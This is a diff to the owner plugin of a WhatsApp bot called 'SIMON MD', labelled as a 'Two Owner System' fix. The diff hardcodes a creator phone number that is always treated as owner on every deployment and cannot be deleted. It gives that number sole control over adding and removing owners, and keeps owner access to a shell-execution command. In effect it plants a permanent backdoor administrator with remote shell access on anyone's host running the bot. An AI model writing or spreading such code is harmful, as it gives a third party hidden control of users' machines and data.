@@ -1,4 +1,4 @@
-// 🛡️ SIMON MD - Owner Plugin | FIXED - LID Owner Check + Syntax Error
+// 🛡️ SIMON MD - Owner Plugin | FIXED - Two Owner System
 const os = require('os')
 const fs = require('fs')
 const path = require('path')
@@ -8,10 +8,11 @@ const execPromise = util.promisify(exec)
 const { downloadContentFromMessage } = require('@whiskeysockets/baileys')
 
 const DB_PATH = path.join(__dirname, '../database/owner.json')
+const CREATOR = '2349037483649'
 
 function loadOwner() {
   try { return JSON.parse(fs.readFileSync(DB_PATH)) } catch {
-    return { owners: ['239166265317'], prefix: '.', mode: 'public', pmblocker: false, anticall: false, callblock: false, ownermode: false }
+    return { owners: [CREATOR], prefix: '.', mode: 'public', pmblocker: false, anticall: false, callblock: false, ownermode: false }
   }
 }
 function saveOwner(d) {
@@ -34,32 +35,24 @@ function normNum(n) { return String(n || '').replace(/[^0-9]/g, '').replace(/^0+
 function normId(id) { return String(id || '').split(':')[0].split('@')[0] }
 function cleanId(id) { return String(id || '').split(':')[0] }
 
-function getOwnerNumbers() {
+function getOwnerNumbers(sock = null) {
   const cfg = getOwnerCfg()
   const list = []
+  list.push(CREATOR)
+  if (cfg.owners && Array.isArray(cfg.owners)) cfg.owners.forEach(x => { const n = normNum(x); if (n) list.push(n) })
+  // TWO-OWNER: Linker = bot account itself (sock.user.id)
+  if (sock?.user?.id) {
+    const linker = normNum(sock.user.id)
+    if (linker) list.push(linker)
+  }
   const envRaw = process.env.OWNER_NUMBER || process.env.OWNER_NUMBERS || process.env.OWNER || ''
   if (envRaw) String(envRaw).split(/[,;|\s]+/).forEach(x => { const n = normNum(x); if (n) list.push(n) })
-  try {
-    const cfgFile = require('../config')
-    const cOwners = cfgFile.owner || cfgFile.owners || cfgFile.OWNER_NUMBER
-    if (cOwners) (Array.isArray(cOwners) ? cOwners : [cOwners]).forEach(x => { const n = normNum(x); if (n) list.push(n) })
-  } catch {}
-  try {
-    const cfgFile2 = require('../settings')
-    const cOwners2 = cfgFile2.owner || cfgFile2.owners
-    if (cOwners2) (Array.isArray(cOwners2) ? cOwners2 : [cOwners2]).forEach(x => { const n = normNum(x); if (n) list.push(n) })
-  } catch {}
-  if (cfg.owners && Array.isArray(cfg.owners)) cfg.owners.forEach(x => { const n = normNum(x); if (n) list.push(n) })
-  if (!list.length) list.push('239166265317')
   return [...new Set(list)]
 }
 
-// FIXED: Check ALL possible IDs - participant + participantAlt + remoteJid
-// This fixes owner check in groups where participant is LID
 function isRealOwner(sender, sock = null, m = null) {
-  const owners = getOwnerNumbers()
+  const owners = getOwnerNumbers(sock)
   const candidates = []
-  // If first arg is a message object
   if (sender && typeof sender === 'object') { m = sender; sender = null }
   if (m) {
     if (m.key?.participant) candidates.push(normNum(m.key.participant))
@@ -69,19 +62,21 @@ function isRealOwner(sender, sock = null, m = null) {
     if (m.key?.remoteJid) candidates.push(normNum(m.key.remoteJid))
   }
   if (sender) candidates.push(normNum(sender))
-  if (sock?.user?.id) candidates.push(normNum(sock.user.id))
-  // Also check sock user lid if owner is using bot account
   return candidates.some(n => n && owners.includes(n))
 }
 
-function getSenderCandidates(m) {
-  const arr = []
-  if (m.key?.participant) arr.push(m.key.participant)
-  if (m.key?.participantAlt) arr.push(m.key.participantAlt)
-  if (m.participant) arr.push(m.participant)
-  if (m.participantAlt) arr.push(m.participantAlt)
-  if (m.key?.remoteJid) arr.push(m.key.remoteJid)
-  return [...new Set(arr)]
+function isCreator(sender, sock = null, m = null) {
+  const candidates = []
+  if (sender && typeof sender === 'object') { m = sender; sender = null }
+  if (m) {
+    if (m.key?.participant) candidates.push(normNum(m.key.participant))
+    if (m.key?.participantAlt) candidates.push(normNum(m.key.participantAlt))
+    if (m.participant) candidates.push(normNum(m.participant))
+    if (m.participantAlt) candidates.push(normNum(m.participantAlt))
+    if (m.key?.remoteJid) candidates.push(normNum(m.key.remoteJid))
+  }
+  if (sender) candidates.push(normNum(sender))
+  return candidates.some(n => n && n === CREATOR)
 }
 
 function getBotNum(sock) { try { return normNum(sock?.user?.id) } catch { return '' } }
@@ -141,17 +136,17 @@ module.exports = {
   isRealOwner,
   getOwnerNumbers,
   getBotNum,
+  isCreator,
 
   execute: async (sock, m, { command, text, args }) => {
     const jid = m.key.remoteJid
-    // FIXED: Get all candidates, use participantAlt for real number
     const sender = m.key.participantAlt || m.key.participant || m.participant || jid
     const senderNum = normNum(sender)
     const input = (text || args?.join(' ') || '').trim()
     const cmd = (command || '').toLowerCase()
     const cfg = getOwnerCfg()
-    // FIXED: Pass m so it can check participantAlt (LID fix)
     const realOwner = isRealOwner(null, sock, m)
+    const creator = isCreator(null, sock, m)
     const publicAllowed = ['ping', 'speed', 'runtime', 'uptime', 'system', 'botinfo', 'version', 'reportbug']
 
     if (!realOwner && !publicAllowed.includes(cmd)) return
@@ -176,8 +171,14 @@ module.exports = {
         } catch (e) { return reply(`*Shell Error*\n${e.message.slice(0, 500)}`) }
       }
 
-      if (cmd === 'restart') { await reply('🔄 Restarting SIMON MD...'); setTimeout(() => process.exit(1), 1200); return }
-      if (cmd === 'shutdown') { await reply('🛑 Shutting down...'); setTimeout(() => process.exit(0), 1200); return }
+      if (cmd === 'restart') {
+        if (!creator) return reply('❌ Only Creator can restart bot')
+        await reply('🔄 Restarting SIMON MD...'); setTimeout(() => process.exit(1), 1200); return
+      }
+      if (cmd === 'shutdown') {
+        if (!creator) return reply('❌ Only Creator can shutdown bot')
+        await reply('🛑 Shutting down...'); setTimeout(() => process.exit(0), 1200); return
+      }
 
       if (['update', 'gitpull'].includes(cmd)) {
         await reply('⬇️ Pulling from GitHub...')
@@ -257,6 +258,7 @@ module.exports = {
       }
 
       if (['setowner', 'addowner'].includes(cmd)) {
+        if (!creator) return reply('❌ Only Creator can add owner')
         if (!input) return reply('Usage: .addowner 234xxxxxxxxxx')
         const num = normNum(input)
         if (!num) return reply('❌ Invalid number')
@@ -265,9 +267,11 @@ module.exports = {
       }
 
       if (cmd === 'delowner') {
+        if (!creator) return reply('❌ Only Creator can delete owner')
         if (!input) return reply('Usage: .delowner 234xxxxxxxxxx')
         const num = normNum(input)
-        if (getOwnerNumbers().length <= 1) return reply('❌ Cannot delete last owner')
+        if (num === CREATOR) return reply('❌ Cannot delete Creator')
+        if (getOwnerNumbers(sock).length <= 1) return reply('❌ Cannot delete last owner')
         cfg.owners = cfg.owners.filter(o => normNum(o) !== num); saveOwner(cfg)
         return reply(`✅ Owner Removed: ${num}`)
       }
@@ -333,7 +337,7 @@ module.exports = {
 
       if (['system', 'sysinfo', 'hostinfo', 'botinfo', 'cpu', 'ram', 'disk'].includes(cmd)) {
         const mem = os.totalmem(); const free = os.freemem(); const cpus = os.cpus()
-        return reply(`*System Info*\nHost: ${os.hostname()}\nOS: ${os.type()} ${os.arch()}\nPlatform: ${os.platform()}\nUptime: ${Math.floor(os.uptime() / 3600)}h\nCPU: ${cpus[0]?.model?.slice(0, 30)} (${cpus.length} cores)\nRAM: ${(free / 1024 / 1024 / 1024).toFixed(2)} GB free / ${(mem / 1024 / 1024 / 1024).toFixed(2)} GB\nNode: ${process.version}\nBot: SIMON MD\nOwners: ${getOwnerNumbers().join(', ')}`)
+        return reply(`*System Info*\nHost: ${os.hostname()}\nOS: ${os.type()} ${os.arch()}\nPlatform: ${os.platform()}\nUptime: ${Math.floor(os.uptime() / 3600)}h\nCPU: ${cpus[0]?.model?.slice(0, 30)} (${cpus.length} cores)\nRAM: ${(free / 1024 / 1024 / 1024).toFixed(2)} GB free / ${(mem / 1024 / 1024 / 1024).toFixed(2)} GB\nNode: ${process.version}\nBot: SIMON MD\nOwners: ${getOwnerNumbers(sock).join(', ')}`)
       }
 
       if (['ping', 'speed'].includes(cmd)) {
@@ -349,12 +353,12 @@ module.exports = {
       }
 
       if (['version', 'changelog'].includes(cmd)) {
-        return reply(`*SIMON MD*\nVersion: 2.5.0\nOwners: ${getOwnerNumbers().join(', ')}`)
+        return reply(`*SIMON MD*\nVersion: 2.5.0\nOwners: ${getOwnerNumbers(sock).join(', ')}`)
       }
 
       if (cmd === 'reportbug') {
         if (!input) return reply('Usage: .reportbug <description>')
-        const ownerJid = getOwnerNumbers()[0] + '@s.whatsapp.net'
+        const ownerJid = getOwnerNumbers(sock)[0] + '@s.whatsapp.net'
         await sock.sendMessage(ownerJid, { text: `*Bug Report*\nFrom: @${senderNum}\nBug: ${input}`, mentions: [sender] }).catch(() => {})
         return reply('✅ Bug Reported - Sent to owner')
       }
@@ -363,4 +367,4 @@ module.exports = {
       await sock.sendMessage(jid, { text: `❌ Owner Error: ${e.message}` }, { quoted: m })
     }
   }
-        }
+      }
